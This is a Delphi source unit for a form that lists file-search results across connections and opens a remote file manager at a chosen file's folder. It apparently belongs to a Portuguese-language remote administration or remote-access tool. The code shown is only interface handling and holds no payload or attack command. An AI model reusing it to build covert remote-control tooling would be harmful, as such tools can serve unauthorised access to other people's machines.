unit UnitFileSearch;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitMain, ComCtrls, AdvProgressBar, ExtCtrls;

type
  TFormFileSearch = class(TForm)
    AdvProgressBar1: TAdvProgressBar;
    bsSkinPanel1: TPanel;
    AdvListView1: TListView;
    procedure AdvListView1DblClick(Sender: TObject);
    procedure AdvListView1KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure FormShow(Sender: TObject);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
  end;

var
  FormFileSearch: TFormFileSearch;

implementation

{$R *.dfm}

uses
  UnitStrings,
  UnitConexao,
  UnitConstantes,
  UnitFileManager,
  UnitAll;

//Here's the implementation of CreateParams
procedure TFormFileSearch.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  Params.WndParent := GetDesktopWindow;
end;

procedure TFormFileSearch.AdvListView1DblClick(Sender: TObject);
var
  NovaJanelaFileManager: TFormFileManager;
  ConAux: TConexaoNew;
  pConAux: pConexaoNew;
  i: integer;
  key: Char;
  Dados: TSearchFilesDados;
begin
  if AdvListView1.Selected = nil then exit;

  application.ProcessMessages;
  ConAux := TConexaoNew(AdvListView1.Selected.Data);
  pConAux := FormMain.MainList.GetNodeData(ConAux.Node);

  FormMain.AbrirFileManager(TConexaoNew(pConAux^));
  TFormAll(ConAux.FormAll).Width := TFormAll(ConAux.FormAll).Width + 1;
  TFormAll(ConAux.FormAll).Width := TFormAll(ConAux.FormAll).Width - 1;

  NovaJanelaFileManager := TFormFileManager(ConAux.FormFileManager);

  while (NovaJanelaFileManager.Visible = True) and
        (NovaJanelaFileManager.TreeView1.Enabled = False) do
  begin
    Application.ProcessMessages;
    sleep(10);
  end;
  NovaJanelaFileManager.ComboBox1.Text := ExtractFilePath(TSearchFilesDados(AdvListView1.Selected.SubItems.Objects[0]).Filename);
  key := #13;
  NovaJanelaFileManager.ComboBox1KeyPress(nil, Key);
end;

procedure TFormFileSearch.AdvListView1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if key = VK_RETURN then
  begin
    AdvListView1DblClick(nil);
  end;
end;

procedure TFormFileSearch.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
end;

procedure TFormFileSearch.FormShow(Sender: TObject);
begin
  Caption := Traduzidos[321];
  AdvListView1.Column[0].Caption := FormMain.MainList.Header.Columns.Items[0].Text;
  AdvListView1.Column[1].Caption := FormMain.MainList.Header.Columns.Items[1].Text;
end;

end.
